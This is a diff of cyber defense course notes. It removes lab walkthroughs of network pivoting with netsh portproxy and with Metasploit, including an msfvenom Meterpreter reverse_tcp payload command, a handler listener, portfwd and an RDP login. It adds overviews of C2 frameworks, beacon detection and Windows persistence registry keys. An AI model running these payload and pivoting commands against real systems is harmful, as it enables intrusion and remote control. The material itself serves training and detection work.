@@ -2899,692 +2899,346 @@ Through the use and analysis of Elastic Stack and Kibana, an outlier data point 
 
 -----------------------------------------------
 
-####### CDAH-M8L2-Pivoting #######
-
-
-Workflow
-
-
-1. Log in to the Virtual Machine (VM) ch-tech-1 using the following credentials:
-Username: trainee
-Password: CyberTraining1!
-
- 
-2. Use an Administrator command prompt to run the following command:
-C:\Windows\system32>ipconfig
-
-![image](https://github.com/user-attachments/assets/7398baa1-e16e-40a3-8209-04dcba23ba00)
-
- 
-The output confirms ch-tech-1 has a connection to the network 172.35.13.0/24 and the network 10.10.0.0/16. 
- 
-3. Create a portproxy listening on port 1337 by running the following command:
-C:\Windows\system32>netsh interface portproxy add v4tov4 listenport=1337 connectport=8000 connectaddress=10.10.13.4
-
-
-
-With this command, data can be sent and received over port 1337 from the compromised host 10.10.13.4 on port 8000. 
- 
-4. To verify the portproxy is listening as expected, run the following command:
-C:\Windows\system32>netsh interface portproxy show v4tov4
-
- 
-The command v4tov4 is a functionality of netsh that maps a port and IPv4 address to send messages received after establishing a separate TCP connection.
- 
-Figure 8.2-8 displays the returned output, which confirms the ch-tech-1 is listening on port 1337 and communicating to receive data from 10.10.13.4 on port 8000. 
-
-![image](https://github.com/user-attachments/assets/e07b6f3b-c23b-42f7-8aec-cc2a9302b71c)
-
-5. Open PowerShell as an Administrator. 
- 
-An artifact of the portproxy method is the configuration information stored in the host's registry. To detect the existence or persistence of portproxy configurations, analyze the registry key as described in the next step. 
- 
-6. Detect persistent portproxy configurations by running the following cmdlet within the PowerShell window: 
-PS C:\Windows\system32> Get-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Services\PortProxy\v4tov4\tcp
-
-The command retrieves properties of a specified item on a defined path. In this instance, PowerShell iterates through the defined registry path for any occurrences of the service portproxy using v4tov4 over TCP. 
- 
-Figure 8.2-9 displays the returned output, which displays the existence of the portproxy in the registry, utilizing port 1337, communicating with the IP address 10.10.13.4 on port 8000. 
-
-![image](https://github.com/user-attachments/assets/1ab50da4-5c4e-49f3-94f3-5c908dab6235)
-
-7. Log in to the VM ch-tech-3 using the following credentials:
-Username: trainee
-Password: CyberTraining1!
-
- 
-8. Open PowerShell.
- 
-9. Create a simple Hypertext Transfer Protocol (HTTP) web server using the exploited machine ch-tech-3 as a host by entering the following command in PowerShell:
-PS C:\Users\trainee> python -m http.server 8000
-
- 
-According to the output, the server is located at http://0.0.0.0:8000/. 
- 
-10. Log in to the VM red-kali using the following credentials:
-Username: trainee
-Password: CyberTraining1!
-
- 
-11. Open Terminal and enter the following commands to retrieve the file test.txt by using the portproxy pivot:
-(trainee@red-kali)-[~] $ wget http://172.35.13.2:1337/Desktop/test.txt
-(trainee@red-kali)-[~] $ cat test.txt
-
-
-
-Figure 8.2-10 displays the returned output, which shows that the file was retrieved. 
-
-![image](https://github.com/user-attachments/assets/0bd0e5e0-e248-47d5-b336-20c3b80755b3)
-
-The commands from the last step connected to the workstation ch-tech-1 at 10.10.13.2, on port 1337. The workstation ch-tech-1 forwards the communication to ch-tech-3 on port 8000 to access and return the file requested. This is a simple example of how pivoting works i n a network. A simple portproxy is set up on an initially compr omised host ch-tech-1 to listen for data from another compromised host ch-tech-3. The workstation ch-tech-3 did not have connectivity to the attacker host red-kali. However, with netsh and portproxy, pivoting was able to deliver the file test.txt from the workstation ch-tech-3 to the host red-kali. 
-
---------------------------------------------------------------
-
-Pivot Using Metasploit
-Walk through pivoting using Metasploit with the following lab. Create a Meterpreter port forward to access a remote desktop through a pivot host.
-
-﻿
-
-Workflow
-﻿
-
-1. Log in to the VM red-kali using the following credentials:
-
-Username: trainee
-Password: CyberTraining1!
-﻿
-
-2. Open Terminal.
-
-﻿
-
-3. Within Terminal, run the following Nmap scan:
-
-(trainee@red-kali)-[~] $ sudo nmap -sn 172.35.13.0/24
-[sudo] password for trainee: CyberTraining1!
-﻿
-
-NOTE: The scan takes 1–2 minutes to complete. 
-
-﻿
-
-Figure 8.2-11 displays the scan results. The ping-only scan returns three hosts, providing little information about the network. 
-
-﻿![image](https://github.com/user-attachments/assets/48c428d3-8681-409a-8713-8d6c15fd77b3)
-
-Scanning for hosts in a network from an external position is normally not possible. These scans may not always return useful data due to firewall rules. Access the network through a simulated exploit and conduct a scan after accessing a machine used to pivot. 
-
-
-4. From the desktop, select Applications.
-
-
-5. Use the Search bar to search for and select Metasploit framework. 
-
-
-NOTE: If prompted, enter the password CyberTraining1! for the user trainee.
-
-
-6. Within the Metasploit session, enter the following series of commands:
-msf6 > use exploit/multi/handler
-msf6 exploit(handler) > set PAYLOAD windows/meterpreter/reverse_tcp
-msf6 exploit(handler) > set LHOST 128.0.7.205
-msf6 exploit(handler) > set LPORT 4444
-msf6 exploit(handler) > set ExitOnSession false
-msf6 exploit(handler) > exploit -j
-
-
-
-Figure 8.2-12 displays the Metasploit session after running the previous commands:
-
-![image](https://github.com/user-attachments/assets/2a4381f6-ab0c-43ea-b368-8d6c49deaf4f)
-
-These commands open a listener on the attacker VM with IP address 128.0.7.205 on port 4444, to “catch” a reverse shell callback from a remote payload. 
-
-
-7. Log in to the VM ch-tech-1 using the following credentials:
-Username: trainee
-Password: CyberTraining1!
-
-
-
-8. Open the folder Executable on the desktop.
-
-
-The folder Executable contains a malicious executable (.exe) file titled test.exe. 
-
-
-9. Run test.exe to establish a reverse TCP shell between the target ch-tech-1 and the attacker host red-kali.
-
-
-The executable, test.exe, is a malicious payload that simulates a user-executed exploit. This type of payload is created using msfvenom with the following command: 
-# msfvenom -p windows/meterpreter/reverse_tcp LHOST=128.0.7.205 LPORT=4444 --platform win -a x86 -f exe -o test.exe -e x86/ -i8
-
-
-
-10. Return to the red-kali VM and access the already established Metasploit session. 
-
-
-Figure 8.2-13 displays the output after opening the payload test.exe. Meterpreter session 1 opens between the attacker host at IP 128.0.7.205:4444 and the target host at IP 172.35.13.2. 
-
-![image](https://github.com/user-attachments/assets/fa267bd0-841b-4e26-8fc6-ad984ef41da3)
-
-Opening the Meterpreter session 1 allows it to be used for accessing and running commands on the target host. 
-
-
-11. Within the Metasploit session, enter the following command:
-msf6 exploit(multi/handler) > sessions
-
-
-
-The output, as displayed in Figure 8.2-14, defines the Operating System (OS), account information, IP addresses, and ports. 
-
-![image](https://github.com/user-attachments/assets/094063e4-9e21-48c8-80b3-6617e79b3ca5)
-
-12. Enter the following command to open a Meterpreter session with the target host:
-msf6 exploit(multi/handler) > sessions -i <session number>
-
-
-
-NOTE: A session number different than the screenshot in step 10 may be displayed during this workflow. 
-
-
-Meterpreter is an attack payload that provides an interactive shell for remotely analyzing and exploring the target machine. After establishing a Meterpreter session, the remainder of the lab focuses on how attackers use Meterpreter to pivot within the exploited network. 
-
-
-13. Within the Meterpreter session, run the following command to display information about the exploited machine:
-meterpreter > ipconfig
-
-
-
-Figure 8.2-15 displays that the target machine has the following three interfaces:
-Interface 1: 127.0.0.1
-Interface 2: 10.10.13.2
-Interface 3: 172.35.13.2
-
-![image](https://github.com/user-attachments/assets/21202717-1ae3-44f4-bf13-9bd67aa838b3)
-
-14. Perform an Address Resolution Protocol (ARP) scan for the given IP range in the Meterpreter session by running the following command with the arp_scanner function:
-meterpreter > run arp_scanner -r 10.10.13.0/24
-
-
-
-ARP presents a table of the documentation and organization of each host's Media Access Control (MAC) address and corresponding IP address. The arp_scanner function within Meterpreter network scanning takes time and leaves the VM red-kali open for 5–10 minutes to display a portion of the results returned from the scan. 
-
-![image](https://github.com/user-attachments/assets/aba4e7f6-5bab-4a1b-8239-eb3b356bc5e5)
-
-15. Create a port forward to 10.10.13.4 on the Windows Remote Desktop Protocol (RDP) port 3389:
-meterpreter > portfwd add -l 3389 -p 3389 -r 10.10.13.4
-
-
-
-The command includes the following elements to establish port forwarding on the pivot host:
-add adds the port forwarding to the list.
--l 3389 is the local port that listens and forwards to the target.
--p 3389 is the destination port on the target host.
--r 10.10.13.4 is the targeted system’s IP address or hostname.
-
-NOTE: For the next step, keep Metasploit and Meterpreter active.
-
-
-16. Use the original terminal or a new terminal to enter the following command:
-(trainee@red-kali)-[~] $ netstat -antp
-
-
-
-The results, as displayed in Figure 8.2-17, indicate that 0.0.0.0 is listening on port 3389 in addition to the pivot host on port 4444.
-
-![image](https://github.com/user-attachments/assets/adef1ab1-3758-47c0-b7f7-db122ffe86b3)
-
-17. In a terminal window separate from Meterpreter, enter the following command to connect to the Windows host 10.10.13.4 over RDP and enter YES at the certificate prompt:
-(trainee@red-kali)-[~] $ rdesktop -d vcch -u trainee -p "CyberTraining1!" 127.0.0.1:3389
-
-
-
-This sequence of port forwards allows the attacker to gain access to the remote host over a forwarded RDP connection.
-
--------------------------------
-
 ##### CDAH-M8L3 C2 Frameworks #####
 
-Detecting Popular C2 Frameworks
-Detect Popular C2 Frameworks
-﻿
 
-This task walks through using Security Onion (SO) and Elastic Stack to perform network analysis in an effort to discover and identify C2 communications. 
+Popular C2 Frameworks
+Command and Control (C2) is the set of tools and functionality used by the adversary, aimed at continuing communication from an exploited and accessed host or machine. C2 most commonly includes communication paths and methods connecting the victim host to the adversary's system. The communication paths are designed to be covert and to mimic expected network traffic in an effort to avoid detection from the victim's network. Within the communication pipeline flows valuable data, stolen from the victim machine. 
 
 ﻿
 
-Workflow
-
+C2 Techniques 
 ﻿
 
-1. Log in to the win-hunt Virtual Machine (VM) using the following credentials:
+As of late 2021, MITRE Adversarial Tactics, Techniques, and Common Knowledge (ATT&CK®) lists 16 C2 techniques in recent cyber campaigns. The C2 techniques contain a variety of sub-techniques and may be leveraged by open-source frameworks.
 
-Username: trainee
-Password: CyberTraining1!
-﻿
 
-2. Open Google Chrome.
-
-﻿
-
-3. Within Google Chrome, select the Security Onion - Home - Elastic bookmark.
-
-﻿
-
-4. Open Security Onion with the following credentials:
-
-Username: trainee@jdmss.lan
-Password: CyberTraining1!
-﻿
-
-5. The Security Onion - Home dashboard covering the Virtual City City Hall (VCCH) workstations (applying a filter to remove the Domain Controller) over the timespan November 23, 2021 @ 11:30:00.000 - November 23, 2021 @ 12:30:00.000 is shown in Figure 8.3-1:
-
-﻿
-
-﻿
-
-Figure 8.3-1
-
-﻿
-
-The number of machines reporting to the Security Information Event Management (SIEM) in the Security Onion - Log Count by Node module is shown in Figure 8.3-2:
-
-﻿
-
-﻿
-
-Figure 8.3-2
-
-﻿
-
-Within a 3-hour time span, the SIEM collected thousands of logs from numerous machines on the VCCH network. The large number of logs collected makes detecting suspicious activity or communication a difficult task.
-
-﻿
-
-The visualization chart of logs collected, as shown in the Security Onion - Logs Over Time module: 
-
-﻿
-
-﻿
-
-Figure 8.3-3
-
-﻿
-
-A key artifact that is often left within C2 communications is consistent, trackable data calls between hosts. The visualization shows that within the defined time span there is no consistent pattern of communication. The chart shows spikes in traffic and logs collected randomly, according to how the logs are collected. The volume and inconsistency of logs across the network make determining good communications from bad communications a difficult task. 
-
-﻿
-
-6. Select the three-line menu.
-
-﻿
-
-7. Select Visualize Library.
-
-﻿
-
-8. Select Create Visualization.
-
-﻿
-
-9. Within the new visualization window, select Aggregation based.
-
-﻿
-
-10. Select Data Table.
-
-﻿
-
-11. In the New Line/Choose dialog box, select *:so-*.
-
-﻿
-
-12. Set the time span for the data table to November 23, 2021 11:30:00.000 - November 23, 2021 @ 12:30:00.000.
-
-﻿
-
-13. Add a bucket using split rows, with the following information:
-
-Aggregation: Terms
-
-Field: agent.hostname.keyword
-
-Metric: Count
-
-Order: Descending 
-
-Size: 100
-
-14. Add another bucket using split rows, with the following information:
-
-Aggregation: Terms
-
-Field: destination.ip
-
-Metric: Count
-
-Order: Descending 
-
-Size: 100
-
-The output shown in the image below is added to the data table. Select the Count column to sort the table in descending order. 
-
-﻿
-
-While there are no suspicious or outlier IP addresses in this table currently, during an investigation this table is an appropriate first step in discovering C2 communications. A suspicious or outlier IP address is an IP address that is not in the same domain and does not follow the same octet numbers. 
-
-﻿
-
-﻿
-
-Figure 8.3-4
-
-﻿
-
-15. Select the three-line menu.
-
-﻿
-
-16. Select Discover.
-
-﻿
-
-17. Set the time span to November 23, 2021 @ 11:30:00.000 - 12:30:00.000. The following output is displayed:
-
-﻿
-
-﻿
-
-Figure 8.3-5
-
-﻿
-
-18. Select + Add Filter and enter the following filter: 
-
-agent.hostname is CH-TECH-2
-﻿
-
-19. Select Update.
-
-﻿
-
-This query filters to only display logs from the CH-TECH-2 workstation during the hour time span, as shown below:
-
-﻿
-
-﻿
-
-Figure 8.3-6
-
-﻿
-
-20. Enter another filter in the search bar: 
-
-destination.ip: 172.35.13.3
-﻿
-
-21. Select Refresh.
-
-﻿
-
-This query adds another filter to the data, displaying only logs that went to the IP address 172.35.13.3 from the CH-TECH-2 workstation during the hour time span. 
-
-﻿
-
-Once a suspicious or outlier IP address has been discovered it is useful to see a visualization. The visualization below shows consistent communications between CH-TECH-2 and IP address 172.35.13.3, by way of green bars on the bar chart. The communications occur on a consistent interval of 5 minutes (or 300 seconds), which is a telltale sign of C2 communications by way of a C2 beacon.
-
-﻿
-
-﻿
-
-Figure 8.3-7
-
-﻿
-
-The adversary can steal data by exfiltrating it over an existing command and control channel. Stolen data is encoded into the normal communications channel using the same protocol as command-and-control communications, as described in technique T1041 using the MITRE ATT&CK® framework. 
-
-﻿
-
-22. Select the arrow next to the date, as shown below:
-
-﻿
-
-﻿
-
-Figure 8.3-8
-
-﻿
-
-Review the data collected within the log file. The key information collected includes the data listed below:
-
-event.module : sysmon 
-
-The log file was collected using sysmon.
-
-event.code : 3
-
-The log file includes sysmon event ID 3. Sysmon event ID 3 is logged when a TCP/UDP connection is made. 
-
-process.name : powershell.exe
-
-The process.name field includes the name of the process that was used to create the event. 
-
-related.user : james.lopez
-
-The related.user name field includes the username that created the event. 
+![image](https://github.com/user-attachments/assets/ca8402cd-ddc6-49a3-a7cd-f50cf91512e8)
 
 ----------------------------------
 
-Detection Analysis
-The VCCH network owner has requested analysis of their network to determine if there is an adversarial presence maintaining communications from an exploited host. VCCH has requested a review of data collected from November 24, 2021, specifically between 11:30:00.000 and 13:00:00.000. 
+Popular C2 Frameworks
+There are significant open-source resources, tools, and methods for C2. Most open-source C2 frameworks are located in the post-exploitation phase of the Cyber Kill Chain® and are focused on two primary goals: detection avoidance and establishing communications. A few of the most popular C2 exploitation frameworks are described below. This is not an exhaustive list, cybersecurity and the common techniques in use are in a constant state of evolution and change.
 
 ﻿
 
-Workflow
+Merlin
+Support of C2 protocols over Hypertext Transfer Protocol (HTTP) and Transport Layer Security (TLS).
+Support on Windows, Linux, macOS Operation Systems (OS). If it works on Go, it works with Merlin.
+Enables Domain Fronting, a technique used to exploit routing schemes to obfuscate intended destination of HTTPS traffic. 
+C2 traffic message padding - adding data to a message/communication to avoid detections based on message/communication size.
+Empire
+﻿
+
+Empire is a post-exploitation framework that includes pure-PowerShell Windows agents, Python 3.x Linux/OS X agents, and C# agents. The framework offers cryptologically secure communications and flexible architecture. Empire includes the following features:
+
+Ability to run PowerShell agents with the use of PowerShell.exe to avoid detection. 
+Rapidly deployable post-exploitation modules that include key loggers and Mimikatz. 
+SHAD0W
+﻿
+
+SHAD0W is a modular C2 framework designed to successfully operate on mature environments. It uses a range of methods to evade Endpoint Detection and Response (EDR) and Anti-Virus (AV) while allowing the operator to continue using tooling and tradecraft they are familiar with. SHAD0W includes the following features:
+
+Docker compatible; runs inside of Docker allowing for cross-platform usage.
+Modular design allows for users to create new modules to interact and task beacons.
+HTTP C2 Communication - All traffic is encrypted and sent using HTTPS.
+Beacons are generated using different tools or formats (such as Executable [.exe] and PowerShell).
+Enables process injection. 
+Build Your Own Botnet
+﻿
+
+Build Your Own Botnet (BYOB) is an open-source, post-exploitation, pre-built, C2 server framework for students, researchers, and developers. BYOB is a beginner-friendly tool designed to be intuitive for those learning about offensive cybersecurity. BYOB includes the following features:
+
+C2 Server with an intuitive, user-friendly, User Interface (UI).
+Custom payload generator for a variety of platforms.
+Allows students and developers to implement their own code and add features without the requirement of writing an original C2 server. 
+
+--------------------------------
+
+Detecting Popular C2 Frameworks
+C2 frameworks often leave behind artifacts and other pieces of evidence of their use behind. It is a tricky task to properly identify the artifacts and the persistence of the adversary in the network. Below are a few current C2 detection methods:
 
 ﻿
 
-1. Open the win-hunt VM using the following credentials:
-
-Username: trainee
-Password: CyberTraining1!
+Detection in Network Traffic
 ﻿
 
-2. Open Security Onion and Elastic Stack using the following credentials:
-
-Username: trainee@jdmss.lan
-Password: CyberTraining1!
-﻿
-
-3. Select the Security Onion - Home dashboard bookmark, and create a Data Table to aid in the investigation of the questionable network activity. Set the time span in Elastic to November 24, 2021 @ 11:30:00.000 to 13:00:00.000.
+Detecting C2 frameworks in network traffic refers to the auditing, analysis, and observation of packet flows across the network. Packets are analyzed by metrics such as size, frequency of being sent/received, and source/destination. When a packet is too large or small, communicates on a consistent interval, or to a suspicious destination, an alert is triggered, requiring analysts to investigate further. A key component of this detection method is close communication and coordination with network analysts to identify suspicious network traffic. 
 
 ﻿
 
-The VCCH utilizes two networks, 172.35/16 and 10.10/16, for daily operations. Reminder, 127.0.0.1 is localhost for the network, the IP address that appears in logs and visualizations. 
+Real Intelligence Threat Analytics
+﻿
+
+Real Intelligence Threat Analytics (RITA) is an open-source, machine-learning, tool that enables C2 beacon detection in network traffic, through ingestion of Zeek logs. RITA features include:
+
+Searching for signs of beaconing behavior in and out of network.
+Searching for signs of Domain Name System (DNS) tunneling by DNS based covert channels.
+Querying blacklists to search for suspicious domains and hosts.
+Detection Using Process Auditing 
+﻿
+
+Detection is accomplished by auditing and analyzing processes utilized by hosts on the network. It is common for hosts that have been exploited to use uncommon processes or exploit insecure processes, such as rundll32.exe. Detection by process auditing requires using security tools (such as Elastic Stack) to monitor all processes being executed across the network. As mentioned, rundll32.exe is a common Dynamic Link Library (DLL) executable, responsible to execute control panel item files. A key characteristic in detection by process auditing includes awareness of processes that are leveraged by the adversary. These processes need to be included in detection rules.
 
 ﻿
 
-NOTE: Remove any filters for the domain controller.
+Detection by API Monitoring
+﻿
 
-----------------------------------------
+Detection is done by monitoring API functions and events. These tools and techniques leveraged by the adversary often spawn events within Windows Event Viewer or Sysmon. The spawned events are monitored to detect activity. The spawned events may include the following activities:
 
-Event Modules
-Sysmon events lead the log count over the 90-minute time span. Sysmon events help to identify and provide detailed information about process creations, network connections, and changes to file creation time.
+Sysmon Event ID 3: Network connection
+The network connection event logs TCP/User Datagram Protocol (UDP) connections on the machine. Each connection is linked to a process through the ProcessId and ProcessGUID fields. The event also contains the source and destination host names, Internet Protocol (IP) addresses, port numbers, and IPv6 status.
+Sysmon Event ID 10: ProcessAccess
+Sysmon 10 is logged when a process opens another process. Often when a process opens another process it is followed by queries or modifications in the address space of the target process. Sysmon 10 enables the detection of tools or functionality that read memory of processes in an attempt to steal credentials. 
+Windows Event ID 4656: A handle to an object was requested
+According to Microsoft, "event 4656 indicates that specific access was requested for an object. The object could be a file system, kernel, or registry object, or a file system object on removable storage or a device. Event 4656 can indicate if an adversary is attempting to utilize or manipulate any of the listed objects in an effort to maintain persistence or create C2 communications." 
+
+------------------------------------------------
+
+
+Communication Interval
+The two filters in place to display data only from host ch-dev-3 to destination IP address 128.07.205 are shown below. 
+
+﻿
+![image](https://github.com/user-attachments/assets/6e0ac9cd-33f4-4b8a-bd45-22efdfabc4c3)
 
 ﻿
 
-﻿![image](https://github.com/user-attachments/assets/5e968f97-90ef-4b46-855f-080ca574656d)
-
-
-Figure 8.3-9
+Figure 8.3-11
 
 ﻿
 
-Create a Data Table
+Communications between host ch-dev-3 and 128.07.205 occurred on a 5-minute interval, establishing communications three times every 15 minutes. The visualization is a clear indication of a repeated connection between a potentially compromised host and an external location. The connections need to be investigated further to determine if the activity is malicious. 
+
+﻿
+![image](https://github.com/user-attachments/assets/79ec7937-fedf-48ac-911c-40dd0045bf35)
+
 ﻿
 
-Create a data table to identify destination IP addresses across the network. The table includes the hostname and the destination IP addresses. 
+Figure 8.3-12
 
-------------------------------
+﻿
 
-Suspicious IP Address
-The IP address 128.0.7.205 is an outlier and needs to be investigated. It does not match any of the other IP addresses in the table. Within the 90-minute time span, the IP address was contacted 18 times. Remember that this is a relatively small sample of all of the network traffic.
+Review Log Information
+﻿
 
-![image](https://github.com/user-attachments/assets/b5a9d423-cc7a-4896-a3ec-ac979443f25f)
+Review the information collected in the log files to answer the subsequent knowledge checks. 
+
+------------------------------------------------
+
+Log Data
+The information collected in the log files within Elastic Stack is shown below.
+
+﻿
+
+Sysmon Event 3
+﻿
+
+The event.code field contains the event ID that was collected. 
 
 
----------------------------------
+![image](https://github.com/user-attachments/assets/ba09c743-daa4-4510-81ad-939d5c6f0464)
+
+
+The event.module field contains the type of log file or tool used to collect the log file. 
+
+![image](https://github.com/user-attachments/assets/f86eb8c8-55b8-4b2e-96f4-f3d1c19a2eb3)
+
+Related User
+
+
+The related.user field contains the user name associated with the log file. 
+
+![image](https://github.com/user-attachments/assets/f30860ef-9b2a-4b1c-bdcc-f17dae95d7ea)
+
+Destination IP Address - Country of Origin
+
+
+The destination.geo.country_name field contains the country of origin for the destination IP address. 
+
+![image](https://github.com/user-attachments/assets/8dc88d77-60a2-4d9f-a83d-f85bb440a4da)
+
+------------------------------------
+
+Analysis Conclusion
+Through the use and analysis of Elastic Stack, an outlier data point within network communications has been identified. The outlier has a unique IP address (128.0.7.205), relative to the other IP addresses in the collected logs, and has established frequent and consistent communications occurring every five minutes.
+
+﻿
+
+Due to the use of PowerShell, it is likely that the compromised machine has the Empire C2 framework. The VM ch-dev-3 needs to be further investigated for adversarial persistence and to identify what data has been compromised and is now experiencing C2 activity. 
+
+---------------------------------------------------
 
 ##### CDAH-M8L4-Persisting in Windows Artifacts #####
 
-Detecting Windows Persistence Using Autoruns
-The CPT is assigned a mission to hunt for and remove malware from infected machines. The malware was found and removed, but it keeps coming back. Check the machine for persistence methods that the malware is using.
+Windows Persistence Overview
+Persistence refers to the installation of an implant, backdoor, or access method which is able to restart or reinstall upon deactivation. The most common example of persistence is the ability of malicious code to survive and restart after a device reboots. Adversaries often configure persistence mechanisms on compromised devices in order to maintain a foothold in a network so they can return for future operations. If a compromised device is stable and rarely reboots, such as in the case of network devices — adversaries may opt out of configuring a persistence mechanism and leave only their malicious code running in memory. Malicious code that only exists in memory is much harder to detect by defenders, but also cannot survive a reboot. In order for adversaries to maintain persistence, artifacts must be saved on the system, which restarts the malicious code. Adversaries use many different persistence methods to keep their foothold in environments they breach. Understanding persistence and knowing the common methods can help defenders detect and prevent adversaries from keeping a foothold in their client environments.
 
 ﻿
 
-Workflow
+The MITRE Adversarial Tactics, Techniques, and Common Knowledge (ATT&CK®) tactic for persistence is TA0003. Below is a list of the techniques and sub-techniques this lesson covers:
+
+T1547.001: Registry Run Keys/Startup Folder
+T1037.001: Logon Script (Windows)
+T1543.003: Windows Service
+T1053.005: Scheduled Task
+Each of these techniques is described in detail in the tasks that follow. 
+
+-------------------
+
+Registry Run Keys/Startup Folder
+Registry Run Keys
+﻿
+
+The registry is one of the oldest persistence techniques used by adversaries. Due to the large and complex nature of the registry, it makes a great hiding place for adversary persistence.
 
 ﻿
 
-1. Log in to the ch-tech-1 Virtual Machine (VM) using the following credentials:
-
-Username: trainee
-Password: CyberTraining1!
-﻿
-
-2. From the desktop, open Autoruns64.
+In Figure 8.4-1, the following registry key is selected: HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
 
 ﻿
 
-Autoruns is part of the Sysinternals suite of tools built by Microsoft. Once opened it scans the system and lists all the known persistence locations which greatly speeds up the time it takes for an analyst to perform a hunt on an infected system for persistence.
+This registry key contains a non-default value of type REG_SZ, which indicates the data is an unstructured string. The highlighted process, VMware User Process, contains the data: "C:|Program Files\VMware\VMware Tools\vmtoolsd.exe" -n vmusr.
 
 ﻿
 
-Near the top of the Autoruns window, there are tabs for each area of persistence that occurs.
+This registry key represents one of the oldest persistence techniques in the history of Windows: the data field of any value in a run key points to an executable that is launched on user login. In this example, vmtoolsd.exe is a legitimate executable associated with VMware. This process is executed whenever a user logs in to the device. An attacker, however, can add a value of their choice to these keys in order to execute their malware.
 
-﻿![image](https://github.com/user-attachments/assets/2b2f1e13-f474-4b28-9614-f8e8db737976)
-
-
+﻿![image](https://github.com/user-attachments/assets/075c5827-3ca7-46fa-826f-1b518ac55a98)
 
 
-Observe the two suspicious entries pointing to C:\persistence.bat.
+The registry keys HKCU\SOFTWARE\Microsoft\CurrentVersion\Run and HKCU\SOFTWARE\Microsoft\CurrentVersion\RunOnce hold values that indicate commands that should be run when that user logs in. The most common registry keys associated with this behavior are listed below. This list includes the keys that are applied to all users (HKLM) and the ones associated with the current user (HKCU).
+HKLM\Software\Microsoft\Windows\CurrentVersion\Run
+HKCU\Software\Microsoft\Windows\CurrentVersion\Run
+HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce
+HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce
+HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnceEx (not created by default on Windows Vista and newer, but can be created by adversaries or system administrators)
+HKCU\Software\Microsoft\Windows NT\CurrentVersion\Run (legacy; older versions of Windows)
+
+The following list shows registry keys used to set Startup folder items for persistence:
+HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders
+HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders
+HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders
+HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders
+
+The following list shows registry keys used to control automatic startup of services during boot:
+HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunServicesOnce
+HKCU\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce
+HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunServices
+HKCU\Software\Microsoft\Windows\CurrentVersion\RunServices
+
+Policy settings can be set to specify startup programs in these registry keys:
+HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run
+HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run
+
+Custom actions can be added to the Winlogon key to add additional actions that occur on a computer system running Windows 7 and later:
+HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Userinit
+HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Shell
+
+Programs can be listed in the load value of HKCU\Software\Microsoft\Windows NT\CurrentVersion\Windows to load when any user logs on.
 
 
-These entries are considered suspicious for the following reasons:
-The publisher is not verified. (The digital signature is not trusted by the system or it has no digital signature at all.)
-It is uncommon for a batch script to run directly from C:\.
-There is no description.
-The HKCU\Environment\UserInitMprLogonScript location does not exist by default. It has to be created.
-
-These indicators on their own are not necessarily suspicious. However, when combined it raises the likelihood that it is infected.
+Adversaries have also been seen to modify the BootExecute value of HKLM\SYSTEM\CurrentControlSet\Control\Session Manager from the default autocheck — autochk * to other programs. The default value is used for file system integrity checks after an abnormal shutdown.
 
 
-Adversaries often attempt to blend in with legitimate services and files. This makes it vital to be aware of what is considered normal activity on a system in the environment. Knowing what is normal makes it more obvious to pick out suspicious activity.
+Not all of the above keys and values may be present on a system but may be created by adversaries to enable that feature. Since Windows applications also use the registry to store configuration data, there are application-specific registry keys that may also be abused by attackers to run malicious code and maintain persistence.
 
 
-4. Select the Scheduled Tasks tab.
+Startup Folder
 
 
-![image](https://github.com/user-attachments/assets/fca817c3-c29d-428c-846f-45b698faed02)
+The Windows startup folder is also an old method of persistence. Any file placed in C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\ is launched automatically whenever any user logs in. It is less common for this method to be used because it is easily detected by anti-virus software or even an observant technician.
 
 
-
-The persistence.bat script is also being started from a scheduled task. During operational use of Autoruns, this also provides insights on the files from VirusTotal. This is helpful to quickly identify known malicious files. Because this lab environment does not contain the internet, Autoruns is unable to reach VirusTotal to pull that additional information.
-
-
-5. Explore the other tabs and become familiar with additional persistence locations.
+Detecting Persistence via Registry Run Keys/Startup Folder
 
 
-In this scenario, there are three persistence methods that would need to be remediated.
+Many environments have anti-virus software installed on endpoints that monitor the well-known autorun registry keys and startup folders. For manual detection on the host, use the Sysinternal s Autoruns too l. For detecting malicious run key activity, use Sysmon event Identifier (ID) 12 (RegistryEvent [Object create and delete]), 13 (RegistryEvent [Value Set]), and 14 (RegistryEvent). Sysmon event ID 11 (FileCreate) can be used to detect the creation of files in startup folders. These methods are covered in a lab later in the lesson.
 
-![image](https://github.com/user-attachments/assets/413b4052-f9b8-4660-9446-59ebd9552fa2)
+-----------------
 
-![image](https://github.com/user-attachments/assets/85cb7985-b888-43cd-b258-f41dd16b7177)
-
----------------------
-
-Detecting Windows Persistence Using a SIEM
-The Cyber Protection Team (CPT) is assigned a mission to hunt for Windows persistence methods. Direct access to the machines is not possible so they need to use Security Onion.
-
-﻿
-
-Workflow
-
-﻿
-
-1. Log in to the win-hunt VM using the following credentials:
-
-Username: trainee
-Password: CyberTraining1!
-﻿
-
-2. Open Chrome.
+Logon Script (Windows)
+Adversaries also use Windows logon scripts to maintain persistence by executing a script during logon initialization. Logon scripts can be run when a specific user  — or group of users — log on to a Windows system. To set up execution of a logon script, the adversary adds the path to the script to the HKCU\Environment\UserInitMprLogonScript registry key.
 
 ﻿
 
-3. Select the Discover - Elastic bookmark.
+Detecting Persistence via Logon Script (Windows)
+﻿
+
+To detect suspicious persistence use the following Sysmon event IDs:
+
+Sysmon event ID 12 (RegistryEvent [Object create and delete])
+Sysmon event ID 13 (RegistryEvent [Value Set])
+Sysmon event ID 14 (RegistryEvent [Key and Value Rename])
+Creating a targeted alert or report specifically monitoring HKCU\Environment\UserInitMprLogonScript reduces the amount of noise in large networks.
 
 ﻿
 
-4. Log in to Security Onion using the following credentials:
